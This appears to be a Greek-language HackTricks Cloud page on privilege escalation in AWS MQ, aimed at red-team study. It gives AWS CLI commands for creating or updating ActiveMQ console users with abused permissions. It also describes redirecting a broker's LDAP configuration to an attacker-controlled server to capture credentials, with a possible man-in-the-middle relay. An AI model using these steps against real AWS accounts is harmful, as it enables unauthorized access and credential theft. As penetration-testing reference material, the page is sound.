# AWS - Προνομιούχα Εξέλιξη στον MQ

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}

## MQ

Για περισσότερες πληροφορίες σχετικά με τον MQ ελέγξτε:

{% content-ref url="../aws-services/aws-mq-enum.md" %}
[aws-mq-enum.md](../aws-services/aws-mq-enum.md)
{% endcontent-ref %}

### `mq:ListBrokers`, `mq:CreateUser`

Με αυτές τις άδειες μπορείτε **να δημιουργήσετε ένα νέο χρήστη σε έναν μεσίτη ActimeMQ** (αυτό δεν λειτουργεί στον RabbitMQ):

{% code overflow="wrap" %}
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
{% endcode %}

**Πιθανή Επίπτωση:** Πρόσβαση σε ευαίσθητες πληροφορίες πλοηγούμενος μέσω του ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Με αυτές τις άδειες μπορείτε **να δημιουργήσετε ένα νέο χρήστη σε έναν μεσίτη ActimeMQ** (αυτό δεν λειτουργεί στο RabbitMQ):

{% code overflow="wrap" %}
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
{% endcode %}

**Πιθανή Επίπτωση:** Πρόσβαση σε ευαίσθητες πληροφορίες πλοηγώντας μέσω του ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Αν ένας μεσίτης χρησιμοποιεί **LDAP** για την εξουσιοδότηση με το **ActiveMQ**. Είναι δυνατόν να **αλλάξετε** τη **διαμόρφωση** του διακομιστή LDAP που χρησιμοποιείται σε **έναν που ελέγχεται από τον επιτιθέμενο**. Με αυτόν τον τρόπο ο επιτιθέμενος θα μπορεί να **κλέψει όλα τα διαπιστευτήρια που στέλνονται μέσω του LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Εάν μπορούσατε να βρείτε τα αρχικά διαπιστευτήρια που χρησιμοποιήθηκαν από το ActiveMQ θα μπορούσατε να εκτελέσετε ένα MitM, να κλέψετε τα διαπιστευτήρια, να τα χρησιμοποιήσετε στον αρχικό διακομιστή και να στείλετε την απάντηση (ίσως απλά επαναχρησιμοποιώντας τα διαπιστευτήρια που κλάπηκαν θα μπορούσατε να το κάνετε αυτό).

**Πιθανή Επίπτωση:** Κλοπή διαπιστευτηρίων ActiveMQ
